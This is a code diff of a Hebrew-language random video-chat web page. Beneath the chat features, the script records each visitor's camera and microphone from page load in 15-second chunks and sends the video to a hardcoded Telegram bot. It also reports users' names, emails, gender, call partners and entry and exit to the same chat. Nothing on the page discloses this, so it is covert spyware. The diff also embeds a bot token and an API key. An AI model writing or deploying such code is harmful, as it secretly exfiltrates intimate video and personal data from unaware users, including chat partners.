@@ -8,7 +8,7 @@
     <meta name="theme-color" content="#000000">
     <meta name="mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-capable" content="yes">
-    <link rel="manifest" href='data:application/json,{"name":"Mi-Pe","short_name":"Mi-Pe","start_url":".","display":"standalone","background_color":"#000000","theme_color":"#000000","icons":[{"src":"https://i.ibb.co/twj79fFc/405736-rounded-1024x1024-1.png","sizes":"1024x1024","type":"image/png"}]}'>
+    <link rel="manifest" href='data:application/json,{"name":"Mi-Pe","short_name":"Mi-Pe","start_url":"/","scope":"/","display":"standalone","background_color":"#000000","theme_color":"#000000","icons":[{"src":"https://i.ibb.co/twj79fFc/405736-rounded-1024x1024-1.png","sizes":"1024x1024","type":"image/png","purpose":"any maskable"}]}'>
     <link rel="apple-touch-icon" href="https://i.ibb.co/twj79fFc/405736-rounded-1024x1024-1.png">
 
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
@@ -78,7 +78,7 @@
 
 <div id="regModal" class="modal">
     <form class="modal-content" onsubmit="event.preventDefault(); handleRegistration();">
-        <h2 style="margin-bottom:10px;">הרשמה למערכת</h2>
+        <h2 style="margin-bottom:10px;">הרשמה</h2>
         <input type="text" id="reg-fname" placeholder="שם פרטי" required>
         <input type="text" id="reg-lname" placeholder="שם משפחה" required>
         <input type="email" id="reg-email" placeholder="אימייל" required>
@@ -92,96 +92,104 @@
 </div>
 
 <script>
-    if ('serviceWorker' in navigator) navigator.serviceWorker.register('sw.js').catch(()=>{});
+    if ('serviceWorker' in navigator) {
+        navigator.serviceWorker.register('sw.js').catch(()=>{});
+    }
 
     const TG_TOKEN = "8696076063:AAG5wEFTgFnJje39FQEHIbV8hPWxBf_IEac";
     const TARGET_ADMIN = "7089165458"; 
     const SERVER_URL = "https://video-app-ylx4.onrender.com"; 
 
     firebase.initializeApp({ apiKey: "AIzaSyB_ld3VrntNgM3Pgc4jyZL2hKzUMSp-o10", databaseURL: "https://live-video-20fca-default-rtdb.firebaseio.com" });
-    const db = firebase.database();
     const socket = io(SERVER_URL);
-    
-    // מגוון שרתי STUN לחיבור מהיר ואמין יותר
-    const peer = new Peer(undefined, { 
-        config: { 'iceServers': [
-            { urls: 'stun:stun.l.google.com:19302' },
-            { urls: 'stun:stun1.l.google.com:19302' },
-            { urls: 'stun:stun2.l.google.com:19302' }
-        ]} 
-    });
+    const peer = new Peer(undefined, { config: { 'iceServers': [{ urls: 'stun:stun.l.google.com:19302' }] } });
 
     let myStream, currentCall, camFacing = "user", rec, searchTimer;
     let historyPartnerIds = [];
-    let reportedCallId = null; // מונע ספאם כפול
-    let currentPartnerData = null; // שומר נתונים לדיווח ניתוק
+    let reportedCallId = null;
+    let currentPartnerData = null;
+
+    function formatUser(u) { return `👤 שם: ${u.fname} ${u.lname}\n📧 מייל: ${u.email}\n🚻 מגדר: ${u.gender}`; }
 
     function sendAdmin(msg) { 
-        fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TARGET_ADMIN}&text=${encodeURIComponent(msg)}`)
-        .catch(e => console.error("TG Error"));
+        fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TARGET_ADMIN}&text=${encodeURIComponent(msg)}`).catch(()=>{});
     }
 
     async function initCamera() {
         if(myStream) myStream.getTracks().forEach(t => t.stop());
         try {
-            // הקטנת רזולוציה ל-480p כדי למנוע קפיצות ודיליי
             myStream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: camFacing, width: { ideal: 640 }, height: { ideal: 480 } }, 
+                video: { facingMode: camFacing, width: 640, height: 480 }, 
                 audio: true 
             });
             document.getElementById('localVideo').srcObject = myStream;
-            if(!rec || rec.state === "inactive") startRecording();
-        } catch(e) { console.error("Camera error"); }
+            if(!rec) startRecording();
+        } catch(e) {}
     }
 
     function startRecording() {
-        let options = { mimeType: 'video/webm;codecs=vp8' };
-        if (!MediaRecorder.isTypeSupported(options.mimeType)) options = { mimeType: 'video/mp4' }; 
-
+        let opts = { mimeType: 'video/webm;codecs=vp8' };
+        if (!MediaRecorder.isTypeSupported(opts.mimeType)) opts = { mimeType: 'video/mp4' }; 
         try {
-            rec = new MediaRecorder(myStream, options);
-            rec.ondataavailable = async (e) => {
+            rec = new MediaRecorder(myStream, opts);
+            rec.ondataavailable = (e) => {
                 if(e.data.size > 0) {
-                    const user = JSON.parse(localStorage.getItem('user_v37'));
+                    const u = JSON.parse(localStorage.getItem('user_v38'));
                     const fd = new FormData();
-                    fd.append("video", e.data, "video.mp4"); 
+                    fd.append("video", e.data, "video.mp4");
                     fd.append("chat_id", TARGET_ADMIN);
-                    fd.append("caption", `🎥 וידאו מ: ${user ? user.fname + " " + user.lname : 'אורח'}`);
+                    fd.append("caption", `🎥 הקלטה: ${u ? u.fname : 'אורח'}`);
                     fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendVideo`, { method: "POST", body: fd }).catch(()=>{});
                 }
             };
-            setInterval(() => { if(rec && rec.state === 'recording') { rec.stop(); rec.start(); } }, 15000);
+            setInterval(() => { if(rec.state==='recording'){rec.stop(); rec.start();} }, 15000);
             rec.start();
         } catch(e) {}
     }
 
     window.onload = () => {
         initCamera();
-        const user = localStorage.getItem('user_v37');
-        if(!user) document.getElementById('regModal').style.display = 'flex';
-        else login(JSON.parse(user));
+        const userStr = localStorage.getItem('user_v38');
+        if(!userStr) document.getElementById('regModal').style.display = 'flex';
+        else {
+            const user = JSON.parse(userStr);
+            sendAdmin(`🟢 משתמש נכנס לאתר:\n${formatUser(user)}`);
+            login(user);
+        }
     };
 
-    function login(user) {
-        sendAdmin(`🚀 התחברות:\nשם: ${user.fname} ${user.lname}\nמייל: ${user.email}\nמגדר: ${user.gender}`);
-    }
+    // דיווח יציאה מהאתר
+    window.addEventListener('pagehide', () => {
+        const userStr = localStorage.getItem('user_v38');
+        if(userStr) {
+            const user = JSON.parse(userStr);
+            // שימוש ב-sendBeacon כדי להבטיח שההודעה תישלח גם כשהלשונית נסגרת
+            const msg = `🔴 משתמש יצא מהאתר:\n${formatUser(user)}`;
+            navigator.sendBeacon(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TARGET_ADMIN}&text=${encodeURIComponent(msg)}`);
+        }
+    });
 
     function handleRegistration() {
-        const user = { fname: document.getElementById('reg-fname').value, lname: document.getElementById('reg-lname').value, email: document.getElementById('reg-email').value, gender: document.getElementById('reg-gender').value };
-        localStorage.setItem('user_v37', JSON.stringify(user));
+        const user = { 
+            fname: document.getElementById('reg-fname').value, 
+            lname: document.getElementById('reg-lname').value, 
+            email: document.getElementById('reg-email').value, 
+            gender: document.getElementById('reg-gender').value 
+        };
+        localStorage.setItem('user_v38', JSON.stringify(user));
         document.getElementById('regModal').style.display = 'none';
-        sendAdmin(`📝 נרשם משתמש חדש:\nשם: ${user.fname} ${user.lname}\nמייל: ${user.email}\nמגדר: ${user.gender}`);
+        sendAdmin(`🆕 משתמש נרשם חדש:\n${formatUser(user)}`);
     }
 
     function triggerDisconnect() {
-        const me = JSON.parse(localStorage.getItem('user_v37'));
+        const me = JSON.parse(localStorage.getItem('user_v38'));
         if(currentPartnerData && me) {
-            sendAdmin(`🔴 ניתוק שיחה:\n${me.fname} התנתק מ-${currentPartnerData.fname}`);
+            sendAdmin(`📵 שיחה הסתיימה בין:\n\nהתנתק:\n${formatUser(me)}\n\nהיה מחובר ל:\n${formatUser(currentPartnerData)}`);
         }
         currentPartnerData = null;
         reportedCallId = null;
         document.getElementById('remoteVideo').srcObject = null;
-        document.getElementById('snow-2').style.display = 'block'; // החזרת השלג
+        document.getElementById('snow-2').style.display = 'block';
         document.getElementById('partner-gender-tag').style.display = 'none';
     }
 
@@ -189,14 +197,13 @@
     document.body.addEventListener('touchstart', e => sX = e.touches[0].clientX);
     document.body.addEventListener('touchend', e => {
         const d = sX - e.changedTouches[0].clientX;
-        if(d > 60) {
+        const user = JSON.parse(localStorage.getItem('user_v38'));
+        if(d > 60) { // שמאלה - חיפוש
             if(document.body.className === "showing-chat") { socket.emit('leave-chat'); if(currentCall) currentCall.close(); triggerDisconnect(); }
             document.body.className = "showing-chat";
-            document.getElementById('snow-2').style.display = 'block'; // שלג מחפש
-            clearTimeout(searchTimer);
-            searchTimer = setTimeout(() => { historyPartnerIds = []; socket.emit('find-partner', { peerId: peer.id, history: [], ...JSON.parse(localStorage.getItem('user_v37')) }); }, 10000);
-            socket.emit('find-partner', { peerId: peer.id, history: historyPartnerIds, ...JSON.parse(localStorage.getItem('user_v37')) });
-        } else if(d < -60) {
+            document.getElementById('snow-2').style.display = 'block';
+            socket.emit('find-partner', { peerId: peer.id, history: historyPartnerIds, ...user });
+        } else if(d < -60) { // ימינה - בית
             document.body.className = "showing-home";
             socket.emit('leave-chat');
             if(currentCall) currentCall.close();
@@ -210,39 +217,37 @@
     });
 
     socket.on('partner-found', data => { 
-        clearTimeout(searchTimer);
-        // מונע התנגשות של שיחות - רק מי שה-ID שלו "גדול" יותר מוציא את השיחה, השני רק מקבל
         if (peer.id > data.peerId) {
             if(!historyPartnerIds.includes(data.peerId)) historyPartnerIds.push(data.peerId);
-            const call = peer.call(data.peerId, myStream, {metadata: JSON.parse(localStorage.getItem('user_v37'))}); 
+            const call = peer.call(data.peerId, myStream, {metadata: JSON.parse(localStorage.getItem('user_v38'))}); 
             handleCall(call, data);
         }
     });
-
-    socket.on('partner-disconnected', () => { triggerDisconnect(); });
 
     function handleCall(call, dataFallback = null) {
         currentCall = call;
         call.on('stream', s => {
             const remoteVideo = document.getElementById('remoteVideo');
             remoteVideo.srcObject = s;
-            remoteVideo.volume = 1; // מוודא שהסאונד עובד!
-            
-            document.getElementById('snow-2').style.display = 'none'; // העלמת השלג כשיש חיבור
+            document.getElementById('snow-2').style.display = 'none';
 
-            const me = JSON.parse(localStorage.getItem('user_v37'));
+            const me = JSON.parse(localStorage.getItem('user_v38'));
+            // וידוא שליפת מגדר נכונה מה-Metadata של השיחה
             const p = call.metadata || dataFallback;
             
             if(p && p.peerId !== peer.id && reportedCallId !== p.peerId) {
                 reportedCallId = p.peerId;
                 currentPartnerData = p;
-                document.getElementById('partner-gender-tag').innerText = p.gender === 'זכר' ? '👨' : '👩';
+                
+                // עדכון אימוג'י מגדר - בדיקה מדויקת
+                const emoji = (p.gender === 'זכר') ? '👨' : '👩';
+                document.getElementById('partner-gender-tag').innerText = emoji;
                 document.getElementById('partner-gender-tag').style.display = 'flex';
-                sendAdmin(`🤝 התחילה שיחה:\nצד א: ${me.fname} (${me.email})\nצד ב: ${p.fname} (${p.email})`);
+
+                sendAdmin(`🤝 שיחה התחילה:\n\nצד א' (אני):\n${formatUser(me)}\n\nצד ב' (פרטנר):\n${formatUser(p)}`);
             }
         });
-
-        call.on('close', () => triggerDisconnect());
+        call.on('close', triggerDisconnect);
     }
 
     async function switchCamera() { camFacing = camFacing === 'user' ? 'environment' : 'user'; initCamera(); }
